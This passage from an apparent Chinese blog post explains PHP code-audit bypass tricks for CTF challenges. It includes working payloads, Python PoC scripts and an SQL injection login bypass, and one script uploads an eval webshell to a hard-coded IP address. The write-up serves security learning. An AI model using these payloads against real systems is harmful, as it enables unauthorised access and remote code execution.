&quot;error&quot;;        exit();    &#125;    $test[$i]=intval($test[$i]);&#125;if(array_search(&quot;admin&quot;,$test)===0)&#123;    echo &quot;flag&quot;;&#125;else&#123;    echo &quot;false&quot;;&#125;?&gt;</code></pre><p> 先判断是不是数组，然后在把数组中的内容一个个进行遍历，所有内容都不能等于admin,类型也必须相同，然后转化成int型，然后再进行比较如果填入值与admin相同，则返回flag,如何绕过呢？<br> 基本思路还是不变，因为用的是三个等于号，所以说“= =”号这个方法基本不能用，那就用第二条思路，利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。这里的重点是intval函数，将数组里的数转换为了int类型，当”admin”这个字符串和数组的数据比较时会变为0，所以payload：test[]=0。  同理，因为intval将数组里的数转换为了int类型，所以我们传入一个字符串还是会变为0，最终效果和直接传入0是一样的。<br>payload：test[]=xxxxx<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664122013954-962e04ee-e03f-49b3-afbb-ae3cc4b1b61c.png" alt="image.png"></p><h4 id="问题"><a href="#问题" class="headerlink" title="==问题"></a>==问题</h4><p>在PHP手册中，in_array()函数的解释是bool in_array ( mixed needle,arrayhaystack [, bool strict=FALSE]),如果strict参数没有提供或者是false(true会进行严格的过滤)，那么inarray就会使用松散比较来判断needle是否在$haystack中。当strince的值为true时，in_array()会比较needls的类型和haystack中的类型是否相同<br>参考例子:</p><pre><code class="php">&lt;?php$array=[0,1,2,&#39;3&#39;];var_dump(in_array(&#39;abc&#39;, $array));  //truevar_dump(in_array(&#39;1bc&#39;, $array));  //true</code></pre><p>通过例子我们就知道了，这个松散的判断就是等于号，所以出现了“= =”号的特性“abc”==0、“1bc”==1，如果不加true的话就可以利用“= =”轻松绕过。array_search同理</p><h2 id="preg-match绕过"><a href="#preg-match绕过" class="headerlink" title="preg_match绕过"></a>preg_match绕过</h2><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664203268848-481347db-314f-49d6-8d10-90798407e863.png" alt="1270588-20200115184356475-448487219.png"><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664203281706-4da909d4-bb4a-4c22-a766-b765b4620ef2.png" alt="1270588-20200115184407398-525177328.png"><br><strong>绕过方法：</strong></p><h3 id="数组绕过-1"><a href="#数组绕过-1" class="headerlink" title="数组绕过"></a>数组绕过</h3><p> preg_match只能处理字符串，当传入的subject是数组时会返回false  </p><pre><code class="php">&lt;?php//模式分隔符后的&quot;i&quot;标记这是一个大小写不敏感的搜索show_source(__FILE__);$a = $_GET[&#39;x&#39;];if (preg_match(&quot;/php/i&quot;, $a)) &#123;    echo &quot;查找到匹配的字符串 php。&quot;;&#125; else &#123;    echo &quot;未发现匹配的字符串 php。&quot;;&#125;?&gt;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664205498275-3b5e7f1d-dbd6-4b3b-962d-2ff47b09c215.png" alt="image.png"><br>此时我们传入的数组中有flag，但是并没有检测到</p><h3 id="PCRE回溯次数限制"><a href="#PCRE回溯次数限制" class="headerlink" title="PCRE回溯次数限制"></a>PCRE回溯次数限制</h3><p>题目:pcrewaf</p><pre><code class="php">&lt;?phpfunction is_php($data)&#123;    return preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data);&#125;if(empty($_FILES)) &#123;    die(show_source(__FILE__));&#125;$user_dir = &#39;data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);$data = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);if (is_php($data)) &#123;    echo &quot;bad request&quot;;&#125; else &#123;    @mkdir($user_dir, 0755);    $path = $user_dir . &#39;/&#39; . random_int(0, 10) . &#39;.php&#39;;    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $path);    header(&quot;Location: $path&quot;, true, 303);&#125;</code></pre><p> 大意是判断一下用户输入的内容有没有PHP代码，如果没有，则写入文件。这种时候，如何绕过is_php()函数来写入webshell呢？<br> PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664206312119-a1275f6a-f3b0-4d55-bd36-d6aa1f4558b5.png" alt="image.png"><br> 我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。<br>poc:</p><pre><code class="python">import requestsfrom io import BytesIOfiles = &#123;  &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[txt]);//&#39; + b&#39;a&#39; * 1000000)&#125;res = requests.post(&#39;http://51.158.75.42:8088/index.php&#39;, files=files, allow_redirects=False)print(res.headers)</code></pre><p>题目二:</p><pre><code class="php">&lt;?phpshow_source(__FILE__);function areyouok($greeting)&#123;    return preg_match(&#39;/Merry.*Christmas/is&#39;,$greeting);&#125;$greeting=@$_POST[&#39;greeting&#39;];if(!is_array($greeting))&#123;    if(!areyouok($greeting))&#123;    if(strpos($greeting,&#39;Merry Christmas&#39;)!==false)&#123;        echo &#39;Merry Christmas. &#39;.&#39;flag&#123;This_is_F1ag&#125;&#39;;    &#125;else&#123;        echo &#39;Do you know .swp file?&#39;;    &#125;    &#125;else&#123;        echo &#39;Do you know PHP?&#39;;&#125;&#125;?&gt;</code></pre><p>poc:</p><pre><code class="php">import requestsurl = &quot;http://127.0.0.1/test.php&quot;;data = &#123;    &quot;greeting&quot;: &quot;Merry Christmas&quot;+&quot;aaaaa&quot;*10000000&#125;res = requests.post(url=url, data=data,allow_redirects=False)print(res.text)</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664210591824-00db5293-f384-4d9d-a2d9-615665f42f07.png" alt="image.png"><br>ps:以上对php7不生效</p><h3 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h3><p><strong>.不会匹配换行符</strong></p><pre><code class="php">&lt;?phpshow_source(__FILE__);header(&quot;content-type:text/html; charset=utf-8&quot;);$json  = $_POST[&#39;x&#39;];if (preg_match(&#39;/^.*(flag).*$/&#39;, $json)) &#123;    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;&#125;else&#123;    $a = str_replace(&quot;\n&quot;,&quot;&quot;,$json);    if (strpos($a,&quot;flag&quot;)!=false)&#123;        echo &quot;flag&#123;xxxxx&#125;&quot;;    &#125;&#125;</code></pre><p>这段代码的意思就是传入的值中不能被preg_match匹配到flag，但是又要存在flag才能获得flag。这里有个关键点，如何只传入\nflag是不行的，因为这样strpos会返回0，相当于false<br>poc:</p><pre><code class="php">import requestsurl = &quot;http://127.0.0.1/test.php&quot;;data = &#123;    &quot;x&quot;: &quot;\naaflag&quot;&#125;res = requests.post(url=url, data=data,allow_redirects=False)print(res.text)</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664212236037-404ab3ea-6564-4da3-a8a5-2b9bac5238ed.png" alt="image.png"><br>** 而在非多行模式下，$似乎会忽略在句尾的%0a**</p><pre><code class="php">if (preg_match(&#39;/^flag$/&#39;, $_GET[&#39;a&#39;]) &amp;&amp; $_GET[&#39;a&#39;] !== &#39;flag&#39;) &#123;    echo $flag;&#125;</code></pre><p>?a=flag%0a</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h3><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664372322802-2f037800-d395-497b-936c-9e5f3803a2f7.png" alt="image.png"><br>使用例子:</p><pre><code class="php">&lt;?php$a = &quot;Original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;?&gt;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664372356449-4949468c-f9f2-4372-af01-87d214424592.png" alt="image.png"><br>ctf题目:</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);$flag = &quot;E:\\phpstudy_pro\\WWW\\flag.txt&quot;;extract($_GET);if (isset($HY))&#123;    $content = trim(file_get_contents($flag));    if ($HY == $content)&#123;        echo file_get_contents(&quot;E:\\phpstudy_pro\\WWW\\flag.txt&quot;);    &#125;else&#123;        echo &#39;Oh,no&#39;;    &#125;&#125;</code></pre><p>payload:</p><pre><code class="php">http://127.0.0.1/test.php?HY=&amp;flag=  //传入HY和flag空值，//extract接受了一个数组，分别赋值造成覆盖</code></pre><p>问题:这里为什么不能给HY和flag分别传入1<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664381662252-e858b918-d47d-4ef3-9619-89d9622fa466.png" alt="image.png"><br>传入两个1后，$HY和$flag都为1，进入if语句，file_get_content(1)，返回为空，但是此时$HY=1，就不相等了，所以同理可以构造多种payload的</p><pre><code class="php">http://127.0.0.1/test.php?HY=&amp;flag=aaa</code></pre><h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h3><p> 解析字符串并注册成变量  </p><pre><code class="php">$b=1;Parse_str(&#39;b=2&#39;);Print_r($b);</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664383931472-7c2603eb-5da6-493d-961a-0cef9d6aed2c.png" alt="image.png"></p><h3 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h3><p> 将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。<br>在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。  </p><pre><code class="php">//导入POST提交的变量值，前缀为post_import_request_variable(&quot;p&quot;， &quot;post_&quot;);//导入GET和POST提交的变量值，前缀为gp_，GET优先于POSTimport_request_variable(&quot;gp&quot;， &quot;gp_&quot;);//导入Cookie和GET的变量值，Cookie变量值优先于GETimport_request_variable(&quot;cg&quot;， &quot;cg_&quot;);</code></pre><h3 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$变量覆盖"></a>$$变量覆盖</h3><p> 提交参数chs，则可覆盖变量”$chs”的值。$key为chs时，$$key就变成$chs  </p><pre><code class="php">&lt;?  $chs = &#39;&#39;;  if($_POST &amp;&amp; $charset != &#39;utf-8&#39;)&#123;      $chs = new Chinese(&#39;UTF-8&#39;, $charset);      foreach($_POST as $key =&gt; $value)&#123;          $$key = $chs-&gt;Convert($value);      &#125;      unset($chs);  &#125; </code></pre><h3 id="register-globals全局变量覆盖"><a href="#register-globals全局变量覆盖" class="headerlink" title="register_globals全局变量覆盖"></a>register_globals全局变量覆盖</h3><p> php.ini中有一项为register_globals，即注册全局变量，当register_globals=On时，传递过来的值会被直接的注册为全局变量直接使用，而register_globals=Off时，我们需要到特定的数组里去得到它。<br> 注意：register_globals已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除  </p><p>当register_global=ON时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等</p><pre><code class="php">&lt;?phpecho &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;;if ($auth)&#123;   echo &quot;private!&quot;;&#125;?&gt;</code></pre><p>当register_globals=OFF时，这段代码不会出问题。<br>但是当register_globals=ON时，提交请求URL：<a href="http://www.a.com/test.php?auth=1,%E5%8F%98%E9%87%8F$auth%E5%B0%86%E8%87%AA%E5%8A%A8%E5%BE%97%E5%88%B0%E8%B5%8B%E5%80%BC%E3%80%82%E5%BE%97%E5%88%B0%E7%9A%84%E7%BB%93%E6%9E%9C%E4%B8%BA">http://www.a.com/test.php?auth=1,变量$auth将自动得到赋值。得到的结果为</a><br>Register_globals:1<br>private!<br><em>小记：如果上面的代码中，已经对变量$auth赋了初始值，比如$auth=0，那么即使在URL中有/test.php?auth=1，也不会将变量覆盖，也就是说不会打印出private！</em><br>利用：<br>通过$GLOBALS获取的变量，也可能导致变量覆盖。</p><pre><code class="php">&lt;?phpecho &quot;Register_globals:&quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;;if (ini_get(&#39;register_globals&#39;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;);print $a;print $_GET[b];?&gt;</code></pre><p>变量$a未初始化，在register_globals=ON时，再尝试控制“$a”的值（<a href="http://www.a.com/test1.php?a=1&amp;b=2%EF%BC%89%EF%BC%8C%E4%BC%9A%E5%9B%A0%E4%B8%BA%E8%BF%99%E6%AE%B5%E4%BB%A3%E7%A0%81%E8%80%8C%E5%87%BA%E9%94%99%E3%80%82">http://www.a.com/test1.php?a=1&amp;b=2），会因为这段代码而出错。</a><br>而当尝试注入“GLOBALS[a]”以覆盖全局变量时（<a href="http://www.a.com/test1.php?GLOBALS%5Ba%5D=1&amp;b=2%EF%BC%89%EF%BC%8C%E5%88%99%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E6%8E%A7%E5%88%B6%E5%8F%98%E9%87%8F%E2%80%9C$a%E2%80%9D%E7%9A%84%E5%80%BC%E3%80%82%E8%BF%99%E6%98%AF%E5%9B%A0%E4%B8%BAunset()%E9%BB%98%E8%AE%A4%E5%8F%AA%E4%BC%9A%E9%94%80%E6%AF%81%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%EF%BC%8C%E8%A6%81%E9%94%80%E6%AF%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%BF%85%E9%A1%BB%E4%BD%BF%E7%94%A8$GLOBALS%E3%80%82">http://www.a.com/test1.php?GLOBALS[a]=1&amp;b=2），则可以成功控制变量“$a”的值。这是因为unset()默认只会销毁局部变量，要销毁全局变量必须使用$GLOBALS。</a><br><strong>而在register_globals=OFF时，则无法覆盖到全局变量。</strong><br><em>小记：register_globals的意思是注册为全局变量，所以当On的时候，传递过来的值会被直接注册为全局变量而直接使用，当为OFF的时候，就需要到特定的数组中去得到它。unset用于释放给定的变量</em></p><h2 id="is-numeric-绕过"><a href="#is-numeric-绕过" class="headerlink" title="is_numeric()绕过"></a>is_numeric()绕过</h2><p> [极客大挑战 2019]BuyFlag  </p><pre><code class="php">if (is_numeric($password)) &#123;        echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;    &#125;elseif ($password == 404) &#123;        echo &quot;Password Right!&lt;/br&gt;&quot;;    &#125;</code></pre><p> 密码是404，但是不能输入数字<br> 可以借助url编码中的空字符，例如%00或者%20，其中%00加在数值前面或者后面都可以，也就是%00404或者404%00这样，将%20加在数值末尾也可以绕过，比如404%20。<br>payload:</p><pre><code class="php">数字-&gt;非数字：404%00404%20404,404&#39;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664439276748-c113f1e6-863f-4757-b928-fad0595e01cd.png" alt="image.png"></p><h2 id="绕过过滤的空白字符"><a href="#绕过过滤的空白字符" class="headerlink" title="绕过过滤的空白字符"></a>绕过过滤的空白字符</h2><pre><code class="php">&lt;?phpheader(&quot;content-type:text/html; charset=utf-8&quot;);highlight_file(__FILE__);$info = &quot;&quot;;$req = [];$flag=&quot;flag&#123;this_is_flag&#125;&quot;;ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值error_reporting(0); //关闭所有PHP错误报告if(!isset($_GET[&#39;number&#39;]))&#123;    header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt    die(&quot;have a fun!!&quot;); //die — 等同于 exit()&#125;foreach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式    foreach($global_var as $key =&gt; $value) &#123;        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串    &#125;&#125;function is_palindrome_number($number) &#123;    $number = strval($number); //strval — 获取变量的字符串值    $i = 0;    $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;        if($number[$i] !== $number[$j]) &#123;            return false;        &#125;        $i++;        $j--;    &#125;    return true;&#125;if(is_numeric($_REQUEST[&#39;number&#39;])) //is_numeric — 检测变量是否为数字或数字字符串&#123;    $info=&quot;sorry, you cann&#39;t input a number!&quot;;&#125;elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))) //intval — 获取变量的整数值&#123;    $info = &quot;number must be equal to it&#39;s integer!! &quot;;&#125;else&#123;    $value1 = intval($req[&quot;number&quot;]);    $value2 = intval(strrev($req[&quot;number&quot;]));    if($value1!=$value2)&#123;        $info=&quot;no, this is not a palindrome number!&quot;;    &#125;    else    &#123;        if(is_palindrome_number($req[&quot;number&quot;]))&#123;            $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;;        &#125;        else        &#123;            $info=$flag;        &#125;    &#125;&#125;echo $info;</code></pre><p>需要满足条件:<br>1.条件is_numeric($_REQUEST[‘number’])为假，这个绕过的方法很多使用%00开头也可以再POST一个number参数把GET中的覆盖掉也可以，所以这一步很简单。<br>2.要求 $req[‘number’]==strval(intval($req[‘number’]))<br>3.要求intval($req[‘number’]) == intval(strrev($req[‘number’]))<br>4.is_palindrome_number()返回False，这个条件只要在一个回文数比如191前面加一个字符即可实现<br>得到flag 看上述条件，条件4需要加字符但是加了之后需要满足2,3这两个条件所以就可以在原题目中简化出2,3,4来进行Fuzzing，简化后后端代码如下：</p><pre><code class="php">&lt;?phpfunction is_palindrome_number($number) &#123;    $number = strval($number); //strval — 获取变量的字符串值    $i = 0;    $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;        if($number[$i] !== $number[$j]) &#123;            return false;        &#125;        $i++;        $j--;    &#125;    return true;&#125;$a = trim($_GET[&#39;number&#39;]);if ((($a==strval(intval($a)))&amp;(intval($a)==intval(strrev($a)))&amp;!is_palindrome_number($a))==1):    print &quot;ok&quot;;else:    print &quot;no&quot;;endif;</code></pre><p>poc:</p><pre><code class="php">import requestsfor i in range(256):    rq = requests.get(&quot;http://127.0.0.1/test3.php?number=%s191&quot;%(&quot;%%%02X&quot;%i))    if &#39;ok&#39; in rq.text:        print (&quot;%%%02X&quot;%i)</code></pre><p>%%%02X这里解释一下:<br>首先分开看  %% 和 %02X 两部分<br>%%第一个为转义的意思，所以这两个一起的意思就是 %<br>%02x  ：%x是把数字输出为16进制的格式，%02x是保证输出至少占两个字符的位置,如果不够两位的话前面补0<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664527433234-991a8002-e11a-4eb8-b6db-ad7f98a1924f.png" alt="image.png"><br>所以可知最终payload有:</p><pre><code class="php">%00%0C404%0C404%00%00%2B404%2B404%00%0C404%20</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664528429736-e234f081-4e74-4e7f-b76c-2717f2d36a86.png" alt="image.png"></p><h2 id="多重加密"><a href="#多重加密" class="headerlink" title="多重加密"></a>多重加密</h2><pre><code class="php">&lt;?php$login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));if($login[&#39;user&#39;] === &#39;ichunqiu&#39;)&#123;echo $flag;&#125;    ?&gt;</code></pre><p>本地:</p><pre><code class="php">&lt;?php$arr = array([&#39;user&#39;] === &#39;ichunqiu&#39;);$token = base64_encode(gzcompress(serialize($arr)));print_r($token);// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=?&gt;</code></pre><h2 id="SQL注入-WITH-ROLLUP绕过"><a href="#SQL注入-WITH-ROLLUP绕过" class="headerlink" title="SQL注入_WITH ROLLUP绕过"></a>SQL注入_WITH ROLLUP绕过</h2><p>当遇到报错:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664545321688-c300c5e7-4b73-4e82-abe0-07cc279954bc.png" alt="image.png"><br>MySQL 5.7.5以上版本，实现了对功能依赖的检测。如果启用了only_full_group_by SQL模式(默认启用)，那么MySQL就会拒绝执行 select list、HAVING condition或ORDER BY list引用既不在GROUP BY子句中被命名，也不在功能上依赖于GROUP BY列（由GROUP BY列唯一确定）的未聚合列的查询。<br>从MySQL5.7.5开始，默认的SQL模式包括only_full_group_by。（在5.7.5之前，MySQL没有检测到功能依赖项，only_full_group_by在默认情况下是不启用的。关于前5.7.5行为的描述，请参阅MySQL 5.6参考手册。)<br>解决方法(暂时):</p><pre><code class="php">SET sql_mode =&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#39;;</code></pre><p>或者在my.ini中追加:</p><pre><code class="php">sql-mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</code></pre><p>题目:</p><pre><code class="php">&lt;?phperror_reporting(0);header(&quot;Content-Type:text/html;charset=utf-8&quot;);if (!isset($_POST[&#39;username&#39;]) || !isset($_POST[&#39;password&#39;])) &#123;    echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;input name=&quot;username&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;input name=&quot;password&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;    die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;    if (is_array($StrValue))&#123;//检测变量是否是数组        $StrValue=implode($StrValue);//返回由数组元素组合成的字符串    &#125;    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;//匹配成功一次后就会停止匹配        print &quot;水可载舟，亦可赛艇！&quot;;        exit();    &#125;&#125;$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;foreach($_POST as $key=&gt;$value)&#123;//遍历数组    AttackFilter($key,$value,$filter);&#125;$con = mysql_connect(&quot;127.0.1.1:3306&quot;,&quot;root&quot;,&quot;root&quot;);if (!$con)&#123;    die(&#39;Could not connect: &#39; . mysql_error());&#125;$db=&quot;test&quot;;mysql_select_db($db, $con);//设置活动的 MySQL 数据库$sql=&quot;SELECT * FROM users WHERE username = &#39;&#123;$_POST[&#39;username&#39;]&#125;&#39;&quot;;$query = mysql_query($sql);//执行一条 MySQL 查询if (mysql_num_rows($query) == 1) &#123;//返回结果集中行的数目    $key = mysql_fetch_array($query);//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false    if($key[&#39;password&#39;] == $_POST[&#39;password&#39;]) &#123;        print &quot;CTF&#123;You_ArE_sUUccesS!&#125;&quot;;    &#125;else&#123;        print &quot;亦可赛艇！&quot;;    &#125;&#125;else&#123;    print &quot;一颗赛艇！&quot;;    print $sql;    print $query;&#125;mysql_close($con);?&gt;</code></pre><p>自己修改配置，连接上数据库.<br>关于WITH ROLLUP绕过我们来看一些例子<br>数据库基本信息:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799167791-f73d8cad-de15-4ed1-b759-6e60ac3bdc7c.png" alt="image.png"><br>使用with rollup语句( 分组后会在多一行统计  )<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799401626-0548b90c-ae44-4931-a58c-0e30f530b0c8.png" alt="image.png"><br>多了一行，id为空，我们搭配limit语句<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799686573-6baf3c8d-5153-405e-9a3f-8c8e34cd9159.png" alt="image.png"><br>那如果我们用password分组呢<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799734140-1e13868d-1733-49ef-a0dc-2cc6720027e7.png" alt="image.png"><br>现在的password为NULL,查询出的白居易是没密码的<br>但是这里的代码中 ,是被过滤的，那么我们可以搭配offset去查询<br>关于他们两个的用法:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664800909937-c4f07ca9-ac72-453d-99a1-47596c230bf8.png" alt="image.png"><br>所以我们就可以构造语句:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664800950046-ac038845-128e-47b6-b80b-2f11f8e05b7a.png" alt="image.png"><br>所以当我们知道用户名的时候，就可以构造sql语句进行绕过，此时password就为NULL<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664804646068-df9eb134-ecf7-4a47-8e40-15d1530d0d45.png" alt="image.png"><br>构造payload:</p><pre><code class="php">username=白居易&#39; GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1#&amp;password=</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664805775369-dcc55dfe-2e38-405e-a694-f4dc4ac7eb03.png" alt="image.png"></p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>代码:</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type:text/html;charset=utf-8&quot;);$flag = &quot;flag&#123;this_Is_f1ag&#125;&quot;;if (isset ($_GET[&#39;password&#39;]))&#123;    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)    &#123;        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;    &#125;    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)    &#123;        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE) //strpos — 查找字符串首次出现的位置        &#123;            die(&#39;Flag: &#39; . $flag);        &#125;        else        &#123;            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);        &#125;    &#125;    else    &#123;        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;    &#125;&#125;?&gt;</code></pre><p>ereg函数:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664806850256-c730b620-320c-4e26-8ba7-0bdecd4986a4.png" alt="image.png"><br> 如果有找到模式匹配，则返回true，否则返回false<br>我们可以使用科学计数法绕过前面<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807270813-9dd92824-beab-45ce-8c55-12346bc1ab1d.png" alt="image.png"><br>但是它又必须要包含”<em>-</em>“,而ereg已经限制了只能为数字和字母<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807305892-33983499-9772-425b-8e27-72a1dcd8b805.png" alt="image.png"><br>我们可以绕过ereg的检测:<br><strong>方法一 %00截断：</strong><br><strong>payload:</strong></p><pre><code class="php">?password=1e9%00*-*</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807530741-53ab0d03-0526-478a-9349-800daeade8ec.png" alt="image.png"><br><strong>方法二  把password通过数组的形式去传参:</strong><br>payload:</p><pre><code class="php">?password[]=1e9&amp;password[]=*-*</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807600826-04801088-c556-44c1-be20-66816ad150da.png" alt="image.png"></p><h2 id="session绕过"><a href="#session绕过" class="headerlink" title="session绕过"></a>session绕过</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type:text/html;charset=utf-8&quot;);$flag = &quot;flag&#123;this_Is_f1ag&#125;&quot;;session_start(); if (isset ($_GET[&#39;password&#39;])) &#123;    if ($_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;])        die (&#39;Flag: &#39;.$flag);    else        